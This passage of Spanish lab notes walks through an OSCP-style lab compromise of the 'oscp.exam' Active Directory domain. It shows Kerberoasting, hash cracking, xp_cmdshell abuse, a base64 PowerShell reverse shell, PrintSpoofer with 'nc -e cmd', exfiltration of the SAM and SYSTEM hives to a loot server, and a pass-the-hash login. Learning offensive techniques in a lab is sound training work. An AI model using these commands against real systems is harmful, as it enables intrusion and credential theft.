Group name     hr                                                                                                                                                                                                 
Comment                                                                                                                                                                                                           
                                                                                                                                                                                                                  
Members                                                                                                                                                                                                           
                                                                                                                                                                                                                  
-------------------------------------------------------------------------------
Frank.Farrell            Jane.Booth               Joan.North                                                                                                                                                      
The command completed successfully.                                                                                                                                                                               
                                     
```

> La propagacion de credenciales no da resultados como tampoco AS-REP roasting

#### Kerberosting con Rubeus

- Subimos Rubeus.exe

```powershell
PS C:\Users\eric.wallows\Documents> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast                                                                                                                            
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast                                                                                                                                                                
                                                                                                                                                                                                                  
   ______        _                                                                                                                                                                                                
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : oscp.exam
[*] Searching path 'LDAP://DC01.oscp.exam/DC=oscp,DC=exam' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
[*] PwdLastSet             : 11/10/2022 12:03:18 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\eric.wallows\Documents\hashes.kerberoast


[*] SamAccountName         : web_svc
[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
[*] PwdLastSet             : 11/10/2022 11:11:19 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\eric.wallows\Documents\hashes.kerberoast

[*] Roasted hashes written to : C:\Users\eric.wallows\Documents\hashes.kerberoas

```
> Encontramos dos usuarios:

1. Descargamos el archivo

```powershell
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> download hashes.kerberoast
                                        
Info: Downloading C:\Users\eric.wallows\Documents\hashes.kerberoast to hashes.kerberoast
                                        
Info: Download successful!

```

2. Buscamos el modo hashcat par crackear los hashes

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol <-- Seleccionamos este modo
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

```

3. Crackeamos los hashes:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$bf05a40b635b8b7b08d831135d46863c$8dd5b6d2af287084cc96fe3a8fea1e97beeb679edd9ad472a360f329545106d6f1c45229694614b67574dc90f8144ee810912150151a50bf69a1184fa4c7a5ecc1e995434107b4c8209b630a32f7a594367f86bbae03e1a7c37a28272473d116220ca9c1c0536bcd15a5f9f457a298620f1f688e7dc9a2a47f17532288cd2293dfe74acfb2f43a512d410406a909def3feca9dcd4c54f69f869e44398a2af89ba88183c07b7d16d4ffdff8cb8588dd35099cd7916eda641b97d59f6eb57ea6dc2ae924a21f42e70a57b21a042ee18cd33fa7d78f8c64d420aed5037c63f011aad057828151bc286e918c65bfd0535ebf848b85a8e357a021b5c011a96b7668cf66cef440ce5ce556ed626f14941c77d26733e3204b85218cfffaeb3e03bf9a62b055991724e86f82309f5c16f4baecd182f578537fd39b4d26a613c835c84bed798134d7868cdf0243babcf44cbeadb5cbbe1702935e326941ab2b1d0ac294f997c5c053051651f3387e8ab63ac67212c2b30c1d56f3073a3ab2a796d32f3b9d304550c6dc5625c170d7b2eaac00023f6f120c16b30c95a8b10e225a487c134025dd9e48f725d9b36a026a6f7479a6d47ba03823d8d249060fefecfcc9d8dc7d52ca1010f68f134b7fc86670b18781629946c45ed2a73995f114c91fc4225bff1911bc31b5d8780dad7dd166e9ace2e535ba9fdc6a052cf8797f4e4f6b343d584f4e579a2a75a51d1a9e4a9d586e94f64905e0fd231b9529ce1816266578298a85a26a43fa0f3ce2c18203f1a85ce14ef9b4ad90a7c7f3a3565cd07aabaf00e706423b7ae54d5649dd9542515f92f719e0465cc6a3530a86410dfae20c2f1d736331641ddb3188d5b890fb15a8e5a2c1b9570ab293559decae5c70e56e7aa9f2a632838db24acfe54845fa515f0db706ef35d3ebaa5dd9dd1875928a65139b052472b7ef04b7290cf0a439742151de04cd741648929a5c6aab18e282dce520b19c3fe381ca91c7248e3a263d334e73878722691b26b0d138bed57cf526140c1da35807908a1cc24274685369852d46666039505c2945d0dbd33f0e6459cd1093d61ea2c8274360d176c10b80cfbbb90894b20048ef0fb50318ed54f92b86339e537abff65da8805b46afd3b04d14d3d1e6830cdf16f82dfa90339516f14dafc4502986499dd4cef2ebe8a2be44897ad2438bd5c5d084b31627dc6f95f520da25fb16d080cf09a5037e5532eb353e3cf8199a64eb80b38a5c1b5a35fd3227a7bfa62f93202a975e9da801678902990497494fd8ea980e76c9d73b52325f27ee6486d6795cb3ab1a46f0cd9e6a22499c0130ebecff3375b7c1de66ca5cf2957fff3f60ea1adcc85cbcb3e1403b687690f1d67953ce0dc153a1b4f1bbaa9ebc1aa445c2e295219ad08612a95fe2fc4400b5a403cbe1a507817f0ed2cab2c302c4bc2d548b631b8232cb35eee52b140ae9db0df960029053e2b07533de5dbd6cbda2af062ce010fda1d15509cc65dc4d25ca3b489a58134e2d59fc:Diamond1
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$1b2f664a01f493269a5c5ce8fd260b0d$b483e3f9d5c98429e06b71e9cc8d6c389666a22e13e0f53faa9630636ffe5406985e205db0b18df70ff613bae09b0082a88ab93464dfe6b6c428e1f6e88714c2ca3dc0f319c0a401720a091b7302695941bce8762bf1f84d322c804a4935eb71771ebef8a7a0d46656b9d4170e81cb5dd6cad70a99b6222a2db20e58e00469c4f7e647cdc3ae46f437659f92593a25f2f428e0c065a146b3b8d9e0812c0c9c9b6464b1259a0aebd652c9cb8a1b450a0c784cb5e0154958b8608810e0bdc3b9a84de720788affe19857ef5c0a7cbecef6e6aac45bdc8c6bac29e0e47a6d991404beee028d20046c03bc2e26f9655d49f5098abe1b72132fce36c46404d22cbfb6e569809b62142bd4e5cfd384db99eb4a90712552635514689d694049303d4a872cbdf8254769754a52beae1c9b08b820db5bdbc8b34d455e348c9c8642ea549205a769c7ee7633af7208560b041b79b54a0151d802fd7fca2a9f658a273bd78ee4208275cde8d88f79de0c61a9d6e5edc81860ee244fb43b660fedd4c8aba7d67955b3b6f5ef1f91d36cd0e79dc4a93243b816481fa3c5772ba4539550d4e4a182ea1eb7585f17cdcc8bdad4b083e92d60deb6951939657d77a64136efa761bb42d70f8ec5bd74ef7902fd6581d466c06b24cb1f7493c8a36bf12e82060df63bb14a0fc6b93ee502aaf0b75f6ce60c3337a1d40ef546f0fa67e37137b7ff00cd12fef21bcc218052b9c2f77565e935796d85c3fd02b1e4d058b3505f6bb3a3baa728e9426469b03c608c5130bc61cc749238e835247a8160e072a8af378ff7c44901d873d6921d5829f55e5c66d5bc91ea5be19353b2e69869fc84a611b1cda5ccdc49000ace9bf2e63901a2199ce51171b27c456701c50812c128ad65becb2a69ed5f8b37564a804771b2879d90081ef7ab2398ca50d252c08d8fd07685608571fe05be4ba76ebe36af0e58cc7832d2ce24e7595c92f431f9db2dc4146ccb4a67ddc501fc796af98e83aa425b2c133c01912ac6bb0b44b976c87474d43cc88b3d88cad122161dbd6ffce5b7b4597468921ddac11fb456a7473de197a045874217fda9d8ed33b1dd82c0c1391cb273462f5b847ee3563debaabfa28b349b3c6fc025cf8affd2656097e6eefd8c24b8db3bd608a91cdddafc39111029fc6cb8117857ee9db4626b26a9dd86a3ac6d6af67b9d837d64e33959e588881ed05893a18883202cdb983854973431918d608db89b115c94faeef77c8d5df6e21089cbe9ae48cb1a04f6185a65bc5beb66fea7154e20261d0a396c174401381cb86a854170555e45df44d20d51845277b0a61f134ebcd8a407729688c932a5a882267827bcd0faa8d9b183b8c095c37ff84d5ef67a87a4e845d68e949e2d63ed2d544a43dec0facce8325ce9e38ace7b37edc081a76d4931ca34fae12beb5e40971fbe4ab351ab88f42c161b285013c3f9eaa2ce82ee47baf7d3e36d116200e74771d94c3c427e9784471c40e02ffe06f98bd0470cf9021a5ad5d6fe10:Dolphin1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hashes.kerberoast
Time.Started.....: Mon Aug 18 16:39:50 2025, (0 secs)
Time.Estimated...: Mon Aug 18 16:39:50 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   909.4 kH/s (7.09ms) @ Accel:32 Loops:38 Thr:1 Vec:16
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 305408/2209035290 (0.01%)
Rejected.........: 0/305408 (0.00%)
Restore.Point....: 1792/14344385 (0.01%)
Restore.Sub.#1...: Salt:1 Amplifier:0-38 Iteration:0-38
Candidate.Engine.: Device Generator
Candidates.#1....: clifford -> love123
Hardware.Mon.#1..: Temp: 55c Util: 25%

Started: Mon Aug 18 16:39:47 2025
Stopped: Mon Aug 18 16:39:52 2025

```

#### Credenciales

|user|password|
|----|--------|
|web_svc | Diamond1 |
|sql_svc | Dolphin1 |


> Levantamos agente y tunel ligolo

* Propagamos credenciales sobre el **DC01**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# nxc smb 10.10.165.146 -u users.txt -p passwords.txt --continue-on-success

SMB         10.10.165.146   445    DC01             [+] oscp.exam\web_svc:Diamond1 
SMB         10.10.165.146   445    DC01             [+] oscp.exam\sql_svc:Dolphin1
```

* Ejecutamos nmap sobre **MS02**


```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# nmap -A -sSVC 10.10.165.148 -oN 148-nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 13:16 -03
Nmap scan report for 10.10.165.148
Host is up (0.14s latency).                                                                                                                                                                                       
Not shown: 995 filtered tcp ports (no-response)                                                                                                                                                                   
PORT     STATE SERVICE       VERSION                                                                                                                                                                              
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                                                                
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                        
445/tcp  open  microsoft-ds?                                                                                                                                                                                      
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                                                                                                                                         
| ms-sql-ntlm-info:                                                                                                                                                                                               
|   10.10.165.148:1433: 
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
|_ssl-date: 2025-08-15T16:18:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-04-24T07:09:27
|_Not valid after:  2055-04-24T07:09:27
| ms-sql-info: 
|   10.10.165.148:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:de:64 (VMware)
| smb2-time: 
|   date: 2025-08-15T16:17:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT       ADDRESS
1   141.17 ms 10.10.165.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.16 seconds
```

### Tabla de puertos y servicios — 10.10.165.148

| Puerto   | Estado | Servicio     | Versión / Descripción                                                       |
| -------- | ------ | ------------ | --------------------------------------------------------------------------- |
| 135/tcp  | open   | msrpc        | Microsoft Windows RPC                                                       |
| 139/tcp  | open   | netbios-ssn  | Microsoft Windows netbios-ssn                                               |
| 445/tcp  | open   | microsoft-ds | (posible SMB / Windows share)                                               |
| 1433/tcp | open   | ms-sql-s     | **Microsoft SQL Server 2019 15.00.2000.00 (RTM)**                           |
|          |        |              | - NetBIOS Domain: `OSCP`<br> - Hostname: `MS02`<br> - DNS: `MS02.oscp.exam` |
| 5985/tcp | open   | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                     |

> Vemos **MSSQL** en **MS02** podemos probar credenciales de **sql_svc** en este host

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# nxc mssql 10.10.206.148 -u users.txt -p passwords.txt 
...
MSSQL       10.10.206.148   1433   MS02             [+] oscp.exam\web_svc:Diamond1 
MSSQL       10.10.206.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
...
```

#### Usamos mssqlclient de impacket para acceder a la db del servidor en cuestion.

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# impacket-mssqlclient sql_svc:Dolphin1@10.10.206.148 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (OSCP\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
    
SQL (OSCP\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

SQL (OSCP\sql_svc  dbo@master)> cmd
ERROR(MS02\SQLEXPRESS): Line 1: Could not find stored procedure 'cmd'.
SQL (OSCP\sql_svc  dbo@master)> !{cmd}
sh: 1: {cmd}: not found
SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL                          

SQL (OSCP\sql_svc  dbo@master)>

```

* Generamos payload en [shells](https://www.revshells.com/)

```bash
ip : 10.10.206.147 <-- Ip interna
port : 4444
shell : powershell #3 (base64)
```

* Establecemos en ligolo los listeners en 4444 y 8000

```bash
listener_add --addr 10.10.206.147:4444 --to 192.168.45.152:4444 --tcp
```

* Ejecutamos
```bash
SQL (OSCP\sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMgAwADYALgAxADQANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

* Receptor

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# nc -lvnp 4444                          
listening on [any] 4444 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.45.152] 58974
whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> hostname
MS02
PS C:\Windows\system32> 
```

* Enumeramos:

```powershell
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name                   SID                                                            
=========================== ===============================================================
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

PS C:\> dir
                                                                                                                                                                                                                  
    Directory: C:\                                                                                                                                                                                                
\                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
d-----         12/7/2019   1:14 AM                PerfLogs                                                                                                                                                        
d-r---        12/20/2022   1:57 AM                Program Files                                                                                                                                                   
d-r---        11/10/2022   2:52 AM                Program Files (x86)                                                                                                                                             
d-r---         12/1/2022   3:15 AM                Users                                                                                                                                                           
d-----        12/20/2022   1:58 AM                Windows                                                                                                                                                         
d-----          4/4/2022   6:00 AM                windows.old                                                                                                                                                     
-a----         8/20/2025   5:29 AM           2692 output.txt 
```

* Obtenemos **windows.old**

```powershell
PS C:\> net view \\10.10.206.147                                                                                                                                                                                  
Shared resources at \\10.10.206.147                                                                                                                                           
                                                                                                                                                                               
Share name  Type  Used as  Comment
                                                                                                                                                                                
------------------------------------------------------------
setup       Disk                                                                                                                                                      
The command completed successfully.
```

> Explorar xcopy C:\windows.old \\10.10.206.147\setup con priviliegios administrativos elevados desde **MS02**

* Aggregamos listener

```bash
listener_add --addr 10.10.170.147:4445 --to 192.168.45.152:4445 --tcp
```

* Ejecutamos PrintSpoofer

```powershell
PS C:\Users\Public\Documents> .\PrintSpoofer64.exe -c "C:\Users\Public\Documents\nc.exe 10.10.170.147 4445 -e cmd"
[+] Found privilege: SeImpersonatePrivilege                                                                                                                                                                       
[+] Named pipe listening...                                                                                                                                                                                       
[+] CreateProcessAsUser() OK

```

* Receptor

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges]
└─# nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.45.152] 33732
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\  
cd C:\

C:\>dir
dir
 Volume in drive C has no label.                                                                                                                                                                                  
 Volume Serial Number is 68A4-24C5                                                                                                                                                                                
                                                                                                                                                                                                                  
 Directory of C:\                                                                                                                                                                                                 
                                                                                                                                                                                                                  
08/21/2025  02:40 PM             2,692 output.txt                                                                                                                                                                 
12/07/2019  02:14 AM    <DIR>          PerfLogs                                                                                                                                                                   
12/20/2022  02:57 AM    <DIR>          Program Files                                                                                                                                                              
11/10/2022  03:52 AM    <DIR>          Program Files (x86)                                                                                                                                                        
12/01/2022  04:15 AM    <DIR>          Users                                                                                                                                                                      
12/20/2022  02:58 AM    <DIR>          Windows                                                                                                                                                                    
04/04/2022  06:00 AM    <DIR>          windows.old
               1 File(s)          2,692 bytes
               6 Dir(s)  10,117,079,040 bytes free

C:\>cd windows.old

C:\Users\Public\Documents>xcopy C:\windows.old\Windows\System32\SAM \\10.10.170.147\setup
xcopy C:\windows.old\Windows\System32\SAM \\10.10.170.147\setup                                                                                                                                                   
C:\windows.old\Windows\System32\SAM                                                                                                                                                                               
Access denied   

```

* Usamos un loot_server descargamos SAM y SYSTEM:

```powershell
C:\Users\Public\Documents>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Public\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.170.147:4446"
.\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.170.147:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Fri, 22 Aug 2025 00:13:33 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5
                    
                    File received.
Headers           : {[Date, Fri, 22 Aug 2025 00:13:33 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SAM


PS C:\Users\Public\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.170.147:4446"
.\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.170.147:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Fri, 22 Aug 2025 00:14:54 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5
                    
                    File received.
Headers           : {[Date, Fri, 22 Aug 2025 00:14:54 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SYSTEM

PS C:\Users\Public\Documents> 
```

* Dumpeamos secrets:

```bash

┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
```

#### Obtenemos el flag

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/5_OSCP-B/AD-Machines]
└─# evil-winrm -i 10.10.170.146 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc -P 5985   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tom_admin\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\Administrator\Desktop                                                                                                                                                                     
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                LastWriteTime         Length Name                                                                                                                                                             
----                -------------         ------ ----                                                                                                                                                             
-a----        8/21/2025   2:40 PM             34 proof.txt                                                                                                                                                        
                                                                                                                                                                                                                  

*Evil-WinRM* PS C:\Users\tom_admin\Documents> type C:\Users\Administrator\Desktop\proof.txt
fd3531af56ec27349df6ea52ad7ebd83
*Evil-WinRM* PS C:\Users\tom_admin\Documents> 
```

==================================================================

## Standalone-Machines

1. Reconocimiento general

```bash
